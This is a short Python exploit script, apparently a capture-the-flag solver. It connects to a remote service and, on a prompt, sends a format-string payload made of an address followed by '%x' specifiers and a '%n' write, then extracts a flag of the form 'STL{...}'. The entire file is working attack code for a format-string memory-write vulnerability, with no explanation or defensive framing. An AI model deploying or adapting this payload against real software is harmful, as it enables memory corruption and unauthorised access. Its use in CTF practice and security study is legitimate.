#!/usr/bin/env python3

import sys
import socket
import re

if len(sys.argv) > 2:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    while True:
        data = s.recv(8192)
        if not data: break
        if data.startswith(b'What should'):
            addr = b'\x2c\xa0\x04\x08'
            sploit = '.%x'*4+'.%n'
            s.send(addr+sploit.encode())
        m = re.search(rb'STL{\w*?}', data)
        if m:
            print(m.group(0).decode())